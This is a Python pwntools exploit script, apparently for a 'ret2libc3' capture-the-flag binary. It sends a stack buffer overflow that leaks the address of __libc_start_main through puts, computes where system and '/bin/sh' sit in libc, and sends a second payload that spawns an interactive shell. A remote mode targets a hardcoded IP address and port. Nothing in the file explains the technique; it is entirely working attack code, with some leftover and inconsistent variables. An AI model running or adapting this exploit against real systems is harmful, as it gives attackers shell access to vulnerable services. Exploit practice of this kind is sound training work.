from pwn import *
debug = True
#context.log_level = "debug"
if debug:
	io = process("./ret2libc3")
	ret2libc3 = ELF("./ret2libc3")
	libc = ELF("/lib32/libc.so.6")
	#gdb.attach(io)
else:
	io = remote("47.75.182.113", 9999)

esp_addr = 0xffffd1f0
char_addr = esp_addr + 0x1C
ebp_addr = 0xffffd278
char_num = ebp_addr-char_addr
system_addr = 0x08048490
fake_ret = "junk"
binsh = 0x08048720
gets_plt = 0x08048460
buf2 = 0x0804A080
popebx = 0x0804843d
puts_plt = 0x08048460
popebx = 0x0804841d
main_addr = ret2libc3.symbols["main"]
print hex(main_addr)
system_addr = libc.symbols["system"]
bin_sh = libc.search("/bin/sh").next()
libc_main_got = ret2libc3.got["__libc_start_main"]
libc_main_got2 = libc.symbols["__libc_start_main"]
#0xf7571190

payload = flat(["A"*char_num,"junk",p32(ret2libc3.symbols["puts"]),p32(popebx),p32(libc_main_got),p32(main_addr)])
io.sendlineafter("it !?",payload)
lib_main_got_addr = u32(io.recv()[0:4])
#lib_main_got_addr = 0xf7571190
print hex(lib_main_got_addr)
libc_base = libc_main_got2 - lib_main_got_addr
system_addr_got = lib_main_got_addr - libc_main_got2 + system_addr
bin_sh_got = lib_main_got_addr - libc_main_got2 + bin_sh
print hex(system_addr_got),hex(bin_sh_got)

payload = flat(["A"*(char_num),"junk",p32(system_addr_got),p32(main_addr),p32(bin_sh_got)])
print len(payload)
io.sendline(payload)
io.interactive()



